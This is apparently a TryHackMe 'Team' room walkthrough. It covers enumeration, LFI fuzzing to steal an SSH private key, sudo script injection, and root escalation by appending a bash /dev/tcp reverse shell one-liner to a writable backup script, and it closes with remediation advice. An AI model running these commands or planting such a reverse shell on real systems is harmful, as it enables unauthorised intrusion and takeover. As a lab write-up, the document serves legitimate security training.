TryHackMe  <br>
Team
---

# Reconnaissance/Scanning:
I started off by scanning the network to see which ports were open/services running on the ports. 
```
$ nmap -A -O -sC -sV -p- <machine_IP>
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/2a351742-235e-4eb5-88f9-c62f4d604044)

Viewing the source code on the Apache splash page:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/2b2b1e9b-72a8-4b26-a6b6-0d198319137c)

 ```
$ echo “<machine_IP> team.thm” >> /etc/hosts
```
Now going to that web page it shows:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/3d92ce38-8172-4de7-9925-81e044e2af97)
 
Scanning for directories with Gobuster:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/21cfd835-6cd1-42e0-adbe-9ee0fb4e3e7a)
 
/robots.txt showed one thing.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/4150b6f2-b273-4392-b248-3e1ce7cd877b)
 
/images had the images on the website, so if I can’t find anything I’ll try some steganography tools on them. <br>
 <br>
The other directories were forbidden to view. <br>
 <br>
Dale didn’t work as a directory so that makes me think it’s a username.  <br>
To test that I’ll try to bruteforce the FTP server first and if that doesn’t work, I’ll try the SSH server after. <br>
While letting hydra run it’s bruteforce attack, I tried to enumerate the forbidden directories. <br>
In /scripts there was a text file.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/7f3bcf47-23dd-440c-9267-22c3b02a2149)
 
The contents of that text file were:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/f6f54583-a726-4b47-b15d-0e540a9be821)
 
I just need to add some more extensions to the directory bruteforce in hopes of finding that old file. <br>
I didn’t have any luck with the wordlists I was using, so I started adding in any kind of extension I’d seen in past CTFs I’ve done and got a hit with script.old <br>
Also, while doing that, after thinking I was going down a rabbit hole, I ran another gobuster scan for virtual hosts this time, thinking that maybe I’ll find something else.
```
$ gobuster vhost -u team.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
 ```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/faac7bb7-7b9d-4642-b4b3-777562acfce7)

Added that to my hosts file and started enumerating that while I opened the script.old file.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/22221d9f-d594-4bd8-8bb4-e540b4e5bbf4)
 
Finally, got some credentials! The wordlist I used in hydra wouldn’t have found that at all.

Here were the gobuster results:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/5603a11d-d581-4fb6-8dfb-00536b155535)

# Vulnerability assessment:
Both directories said the same thing, however, /index.php had a redirect link.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/817e081d-df37-4820-b4a5-d1a9c094c5d9)
 
In the link, if it’s misconfigured, can offer LFI (Local File Inclusion) and I can test that by trying to fuzz the parameter page  <br>
to a vulnerable parameter and look for a file of interest such as /etc/passwd. <br>
Luckily for me, it IS vulnerable!
 
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/77f8a06d-2490-46b1-83b5-f681bb3f453a)

 ![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/c09af595-ac12-40c9-815c-316460507153)

Looks like a few users on that machine can get a shell. I still need to find out dale’s password.. <br>
Jumping back to the FTP server, here’s the files on it.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/c7485f5f-35af-4d6b-934e-1db2d41cf022)
 
This looks promising! <br>

In /workshare:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/8c6649f9-84ca-4671-a6dd-673d4aebb611)
 
In /.ssh, unfortunately no key file here.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/9a3c98bc-c28d-4ea0-8b69-b6f65611d9c6)
 
The contents of New_site.txt just confirmed by finding of the other sub domain.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/0f463c02-0dd5-4dcd-8221-9d692aaeead8)
 
The contents of known_hosts:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/82269b27-3da1-4ecf-afe8-38a69e962d37)
 
Well, since there’s a LFI vulnerability on the machine I’ll try to fuzz for SSH files to find that private key (id_rsa).
```
$ gobuster fuzz -u http://dev.team.thm/script.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt | grep "ssh"
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/c157c9f0-be59-42e1-982d-93a0fb31c508)
 
I started to go down the list, checking each one and the second link had Dale’s private key! <br>
It wasn’t in a good format from the LFI so I viewed the source code of the page to get it  <br>
in the right format without extra spaces in the lines.
 
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/b3b3eb8b-d554-48f3-8620-8127b8f50382)

*NOTE: Private keys do not have the pound/hashtag signs, so be sure to remove those.  <br>
Also for private key files they need to be read only permissions (chmod 400 <private_key_file>)* <br>

# Initial foothold:
Finally got a foothold on the system!
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/051c291e-8afa-489b-8374-80e9aef50b3b)
 
First things to check, can I run anything as root/another user? Yes!

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/be9fabe2-5ade-426d-a836-d0d29966d0ee)
 
I’ll also grab the user flag in Dale’s home directory while I’m there.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/8a6934d7-1db7-4c60-973d-bfa6785a4953)
 
Now let’s see what the admin_checks file is all about.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/d7154ddc-2041-4a5c-84ed-c072dbcfa7bf)
 
A file I can execute as another user and potentially exploit the variables in it. Error was the injection point.

# Lateral pivoting:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/eae1c2e4-d0fe-4756-9984-8755081eb1a1)

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/52289935-9dd9-416d-9b0a-41464f5988c3)
 
This user is in a few groups, that’s noteworthy. <br>
As this user, I checked the .bash_history for any clues since it didn’t get deleted. <br>
A few files were accessed that I’ll have to look into.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/369c7a3a-4860-4f4e-bcd1-29a0ca73138c)
 
In /opt the directory admin_stuff is owned by root so I can’t edit or change it.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/013b542b-8daa-477c-b5d0-d0683c83ecf4)
 
This is the content of script.sh:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/eb43a5d6-df67-40f6-a468-6fbdb8dfc754)

# Privilege escalation: 
It’s a good idea to check the permissions on the scripts to see if this user has any writable permissions.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/a1dd0b52-65c6-4002-9402-e6dd49b6ba3f)

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/e97d35b2-c03b-4b90-b06f-db68f6591100)

Cool, this user can edit the main_backup.sh script. I’ll add a reverse shell one liner to that.
```
bash -c 'exec bash -i &>/dev/tcp/<attack_IP>/<port> <&1'
```
Reverse shell as root!

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/f6e1087c-ff12-4044-b7e8-cf8c99147779)
 
Time to grab that root flag!

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/afde30f4-e6da-4a24-86ad-bae23df3711c)
 
# Reporting:
* Remove old files that aren't in use anymore from the machine and/or don't make them accessible to the public. <br>
* Enforce input validation to prevent vulnerabilities such as LFI. <br>
* Maintain proper user/group permissions to prevent users from having read/write ability to certain files/folders if an attacker compromises said user(s). <br>
* Make sure hidden files such as .bash_history are cleared by sending the output to null with "2>/dev/null"






